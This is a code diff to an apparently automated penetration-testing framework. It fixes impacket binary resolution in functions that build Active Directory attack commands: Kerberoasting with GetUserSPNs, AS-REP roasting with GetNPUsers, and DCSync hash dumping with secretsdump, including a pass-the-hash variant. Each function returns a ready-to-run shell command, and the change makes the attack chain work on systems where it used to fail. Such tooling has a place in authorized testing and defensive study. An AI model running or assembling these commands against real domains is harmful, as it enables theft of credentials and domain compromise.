@@ -98,9 +98,24 @@ def ad_enum_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> L
                     evidence=output.strip()[:200])]
 
 
+def _impacket(name: str) -> str:
+    """The installed binary for an impacket script.
+
+    Modern installs ship them as `impacket-<name>` (pip entry points /
+    Debian packaging) instead of the legacy `.py` scripts: building the
+    command with the logical name made the whole AD chain fail on boxes
+    where the tool IS installed.
+    """
+    try:
+        from phantom.automation.runtime.toolchain import resolve_tool
+        return resolve_tool(name)
+    except Exception:
+        return name
+
+
 def kerberoast_command(domain: str, username: str, password: str, host: str = "127.0.0.1") -> str:
     dc = host if host and host != "127.0.0.1" else domain
-    return (f"GetUserSPNs.py -dc-ip {dc} -request "
+    return (f"{_impacket('GetUserSPNs.py')} -dc-ip {dc} -request "
             f"{domain}/{username}:{password} && echo KERBEROAST_OK")
 
 
@@ -128,7 +143,7 @@ def as_rep_roast_command(domain: str, username: str, password: str,
     """AS-REP roasting: request tickets for accounts with Kerberos
     pre-authentication disabled (impacket GetNPUsers.py)."""
     dc = host if host and host != "127.0.0.1" else domain
-    return (f"GetNPUsers.py -dc-ip {dc} -request "
+    return (f"{_impacket('GetNPUsers.py')} -dc-ip {dc} -request "
             f"{domain}/{username}:{password} && echo ASREP_ROAST_OK")
 
 
@@ -157,9 +172,9 @@ def dc_sync_command(domain: str, username: str, password: str,
     auth = f"{domain}/{username}"
     if _IS_NTLM.match(password):
         cred = f"{auth}@{dc}"
-        cmd = f"secretsdump.py -just-dc {cred} -hashes :{password}"
+        cmd = f"{_impacket('secretsdump.py')} -just-dc {cred} -hashes :{password}"
     else:
-        cmd = f"secretsdump.py -just-dc {auth}:{password}@{dc}"
+        cmd = f"{_impacket('secretsdump.py')} -just-dc {auth}:{password}@{dc}"
     return f"{cmd} && echo DCSYNC_OK"
 
 
